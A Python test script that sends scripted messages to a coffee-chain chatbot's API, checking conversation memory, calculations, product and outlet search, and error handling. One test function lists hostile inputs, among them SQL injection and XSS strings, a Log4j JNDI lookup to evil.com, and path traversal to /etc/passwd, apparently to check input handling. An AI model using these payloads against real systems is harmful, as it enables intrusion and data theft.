#!/usr/bin/env python3
"""
Comprehensive test script for ZUS Coffee Advanced Chatbot Patterns
Tests all advanced conversation scenarios including multi-turn, slot recall,
calculation, RAG, text2SQL, error handling, and malicious input handling.
"""

import requests
import json
import time
from typing import Dict, Any, List
import sys

# Backend URL
BACKEND_URL = "https://zuschat-rag-api.onrender.com"
# BACKEND_URL = "http://localhost:8000"  # For local testing

class ChatbotTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session_id = f"test_session_{int(time.time())}"
        self.conversation_history = []
    
    def chat(self, message: str, timeout: int = 30) -> Dict[str, Any]:
        """Send a chat message and return the response."""
        try:
            response = requests.post(
                f"{self.base_url}/chat",
                json={"message": message, "session_id": self.session_id},
                timeout=timeout
            )
            response.raise_for_status()
            result = response.json()
            
            # Store conversation history
            self.conversation_history.append({
                "user": message,
                "bot": result.get("message", result.get("response", "")),
                "timestamp": time.time()
            })
            
            return result
        except requests.exceptions.RequestException as e:
            print(f"❌ Request failed: {e}")
            return {"response": f"Error: {e}", "error": str(e)}
    
    def print_response(self, message: str, response: Dict[str, Any]):
        """Print formatted conversation exchange."""
        print(f"\n🧑‍💻 User: {message}")
        bot_message = response.get('message', response.get('response', 'No response'))
        print(f"🤖 Bot: {bot_message}")
        if 'confidence' in response and response['confidence'] is not None:
            print(f"📊 Confidence: {response['confidence']}")
        if 'intent' in response and response['intent'] is not None:
            print(f"🎯 Intent: {response['intent']}")
        if 'action' in response and response['action'] is not None:
            print(f"⚡ Action: {response['action']}")
        print("-" * 80)

def test_health_check(tester: ChatbotTester) -> bool:
    """Test if the backend is healthy."""
    try:
        response = requests.get(f"{tester.base_url}/health", timeout=10)
        if response.status_code == 200:
            print("✅ Backend health check passed")
            return True
        else:
            print(f"❌ Backend health check failed: {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ Backend health check failed: {e}")
        return False

def test_basic_patterns(tester: ChatbotTester):
    """Test basic conversation patterns."""
    print("\n🔍 TESTING BASIC CONVERSATION PATTERNS")
    print("=" * 50)
    
    test_cases = [
        "Hello",
        "Hi there!",
        "Good morning",
        "What products do you have?",
        "Tell me about your coffee",
        "Show me your menu",
        "Where are your outlets?",
        "Find outlets near KL",
        "What are your opening hours?",
        "Thank you",
        "Goodbye"
    ]
    
    for message in test_cases:
        response = tester.chat(message)
        tester.print_response(message, response)
        time.sleep(1)  # Rate limiting

def test_multi_turn_conversation(tester: ChatbotTester):
    """Test multi-turn conversation with context retention."""
    print("\n🔍 TESTING MULTI-TURN CONVERSATION")
    print("=" * 50)
    
    # Start a conversation about products
    response1 = tester.chat("What coffee products do you have?")
    tester.print_response("What coffee products do you have?", response1)
    time.sleep(1)
    
    # Follow up with related questions
    response2 = tester.chat("What about their prices?")
    tester.print_response("What about their prices?", response2)
    time.sleep(1)
    
    response3 = tester.chat("Which one is the cheapest?")
    tester.print_response("Which one is the cheapest?", response3)
    time.sleep(1)
    
    response4 = tester.chat("How about the most expensive one?")
    tester.print_response("How about the most expensive one?", response4)
    time.sleep(1)
    
    # Switch context to outlets
    response5 = tester.chat("Now tell me about your outlets in Kuala Lumpur")
    tester.print_response("Now tell me about your outlets in Kuala Lumpur", response5)
    time.sleep(1)
    
    # Follow up on outlets
    response6 = tester.chat("What are their opening hours?")
    tester.print_response("What are their opening hours?", response6)
    time.sleep(1)

def test_slot_recall_memory(tester: ChatbotTester):
    """Test slot filling and memory recall."""
    print("\n🔍 TESTING SLOT RECALL AND MEMORY")
    print("=" * 50)
    
    # Provide partial information
    response1 = tester.chat("I want to find a ZUS outlet")
    tester.print_response("I want to find a ZUS outlet", response1)
    time.sleep(1)
    
    # Bot should ask for more details
    response2 = tester.chat("In Selangor")
    tester.print_response("In Selangor", response2)
    time.sleep(1)
    
    # Provide more specific location
    response3 = tester.chat("Near Subang Jaya")
    tester.print_response("Near Subang Jaya", response3)
    time.sleep(1)
    
    # Test recall - refer back to previous query
    response4 = tester.chat("What about their contact details?")
    tester.print_response("What about their contact details?", response4)
    time.sleep(1)

def test_calculation_engine(tester: ChatbotTester):
    """Test calculation capabilities."""
    print("\n🔍 TESTING CALCULATION ENGINE")
    print("=" * 50)
    
    calculation_tests = [
        "Calculate 15.50 + 8.90 + 12.00",
        "What's 25% tax on RM 50?",
        "If I buy 3 coffees at RM 8.50 each, what's the total?",
        "What's 10% discount on RM 100?",
        "Calculate the tip: 15% of RM 45.60",
        "What's (25.50 + 18.90) * 1.06 for tax?",
        "How much is 2 lattes at RM 9.50 and 1 cake at RM 15.90?",
        "Calculate my bill: 2 items at RM 12.50 each plus 6% tax"
    ]
    
    for calc in calculation_tests:
        response = tester.chat(calc)
        tester.print_response(calc, response)
        time.sleep(1)

def test_rag_product_search(tester: ChatbotTester):
    """Test RAG-based product search and recommendations."""
    print("\n🔍 TESTING RAG PRODUCT SEARCH")
    print("=" * 50)
    
    product_tests = [
        "What coffee drinks do you recommend?",
        "Show me something sweet",
        "I want a cold drink",
        "What's your strongest coffee?",
        "Do you have any pastries?",
        "What's good for breakfast?",
        "I'm looking for something under RM 10",
        "What's popular among customers?",
        "Recommend me a signature drink",
        "What goes well with coffee?"
    ]
    
    for query in product_tests:
        response = tester.chat(query)
        tester.print_response(query, response)
        time.sleep(1)

def test_text2sql_outlet_queries(tester: ChatbotTester):
    """Test text-to-SQL outlet filtering."""
    print("\n🔍 TESTING TEXT2SQL OUTLET QUERIES")
    print("=" * 50)
    
    outlet_tests = [
        "Find outlets in Kuala Lumpur",
        "Show me ZUS outlets in Selangor",
        "Are there any outlets in Johor?",
        "Find outlets that open 24 hours",
        "Which outlets are open on weekends?",
        "Show me outlets near shopping malls",
        "Find outlets with drive-through",
        "What outlets are in KLCC area?",
        "Show me all outlets in Penang",
        "Find the nearest outlet to me"
    ]
    
    for query in outlet_tests:
        response = tester.chat(query)
        tester.print_response(query, response)
        time.sleep(1)

def test_context_switching(tester: ChatbotTester):
    """Test context switching between topics."""
    print("\n🔍 TESTING CONTEXT SWITCHING")
    print("=" * 50)
    
    # Start with products
    response1 = tester.chat("What's your best-selling coffee?")
    tester.print_response("What's your best-selling coffee?", response1)
    time.sleep(1)
    
    # Switch to outlets abruptly
    response2 = tester.chat("Where's your Pavilion outlet?")
    tester.print_response("Where's your Pavilion outlet?", response2)
    time.sleep(1)
    
    # Switch to calculation
    response3 = tester.chat("Calculate 15% of RM 80")
    tester.print_response("Calculate 15% of RM 80", response3)
    time.sleep(1)
    
    # Switch back to products
    response4 = tester.chat("What about your tea selection?")
    tester.print_response("What about your tea selection?", response4)
    time.sleep(1)
    
    # Switch to general inquiry
    response5 = tester.chat("What time do you close?")
    tester.print_response("What time do you close?", response5)
    time.sleep(1)

def test_error_handling(tester: ChatbotTester):
    """Test error handling and graceful degradation."""
    print("\n🔍 TESTING ERROR HANDLING")
    print("=" * 50)
    
    error_tests = [
        "",  # Empty message
        "   ",  # Whitespace only
        "asdfghjkl qwertyuiop",  # Gibberish
        "Find outlets in Pluto",  # Impossible location
        "Calculate the square root of negative infinity",  # Impossible calculation
        "Show me products that cost negative money",  # Impossible price
        "What's the weather like?",  # Out of scope
        "Book me a flight to Paris",  # Out of scope
        "Tell me a joke",  # Out of scope but reasonable
        "What's the meaning of life?"  # Philosophical
    ]
    
    for test in error_tests:
        response = tester.chat(test)
        tester.print_response(test, response)
        time.sleep(1)

def test_malicious_input_handling(tester: ChatbotTester):
    """Test handling of potentially malicious or problematic inputs."""
    print("\n🔍 TESTING MALICIOUS INPUT HANDLING")
    print("=" * 50)
    
    malicious_tests = [
        "DROP TABLE products;",  # SQL injection attempt
        "<script>alert('xss')</script>",  # XSS attempt
        "' OR '1'='1",  # SQL injection
        "{{7*7}}",  # Template injection
        "${jndi:ldap://evil.com/a}",  # Log4j injection
        "../../../etc/passwd",  # Path traversal
        "SELECT * FROM users WHERE admin=1",  # SQL injection
        "javascript:alert(1)",  # JavaScript injection
        "<img src=x onerror=alert(1)>",  # XSS
        "../../config/database.yml"  # File inclusion
    ]
    
    for test in malicious_tests:
        response = tester.chat(test)
        tester.print_response(f"[MALICIOUS INPUT]: {test}", response)
        time.sleep(1)

def test_edge_cases(tester: ChatbotTester):
    """Test edge cases and boundary conditions."""
    print("\n🔍 TESTING EDGE CASES")
    print("=" * 50)
    
    edge_tests = [
        "A" * 1000,  # Very long message
        "what's the price of " + "coffee " * 100,  # Repetitive text
        "SHOW ME ALL YOUR OUTLETS RIGHT NOW!!!",  # All caps with urgency
        "can you help me find... um... what was I looking for?",  # Confused user
        "I want to buy buy buy buy coffee coffee coffee",  # Stuttering
        "Find outlets in Malaysia, Singapore, Thailand, Indonesia, Philippines",  # Multiple countries
        "Calculate 1/0",  # Division by zero
        "Show me products priced between RM -5 and RM 999999",  # Invalid range
        "What outlets are open at 25:00?",  # Invalid time
        "Find me 0 products"  # Zero quantity
    ]
    
    for test in edge_tests:
        response = tester.chat(test)
        tester.print_response(f"[EDGE CASE]: {test[:50]}...", response)
        time.sleep(1)

def test_performance_stress(tester: ChatbotTester):
    """Test performance under rapid requests."""
    print("\n🔍 TESTING PERFORMANCE STRESS")
    print("=" * 50)
    
    print("Sending 10 rapid requests to test performance...")
    start_time = time.time()
    
    for i in range(10):
        response = tester.chat(f"Quick test message {i+1}")
        print(f"Request {i+1}: {response.get('response', 'Error')[:50]}...")
    
    end_time = time.time()
    total_time = end_time - start_time
    avg_time = total_time / 10
    
    print(f"📊 Performance Results:")
    print(f"   Total time: {total_time:.2f} seconds")
    print(f"   Average response time: {avg_time:.2f} seconds")
    print(f"   Requests per second: {10/total_time:.2f}")

def main():
    """Run all test suites."""
    print("🚀 ZUS COFFEE ADVANCED CHATBOT TESTING")
    print("=" * 60)
    print(f"Backend URL: {BACKEND_URL}")
    print("=" * 60)
    
    # Initialize tester
    tester = ChatbotTester(BACKEND_URL)
    
    # Health check first
    if not test_health_check(tester):
        print("❌ Backend is not healthy. Exiting tests.")
        sys.exit(1)
    
    try:
        # Run all test suites
        test_basic_patterns(tester)
        test_multi_turn_conversation(tester)
        test_slot_recall_memory(tester)
        test_calculation_engine(tester)
        test_rag_product_search(tester)
        test_text2sql_outlet_queries(tester)
        test_context_switching(tester)
        test_error_handling(tester)
        test_malicious_input_handling(tester)
        test_edge_cases(tester)
        test_performance_stress(tester)
        
        # Summary
        print("\n🎉 ALL TESTS COMPLETED!")
        print("=" * 60)
        print(f"Total conversation exchanges: {len(tester.conversation_history)}")
        print(f"Session ID: {tester.session_id}")
        print("Test results have been logged above.")
        
        # Optionally save conversation history
        with open(f"test_results_{int(time.time())}.json", "w") as f:
            json.dump(tester.conversation_history, f, indent=2)
        print("📁 Conversation history saved to test_results_*.json")
        
    except KeyboardInterrupt:
        print("\n⏹️  Tests interrupted by user")
    except Exception as e:
        print(f"\n❌ Test suite failed with error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
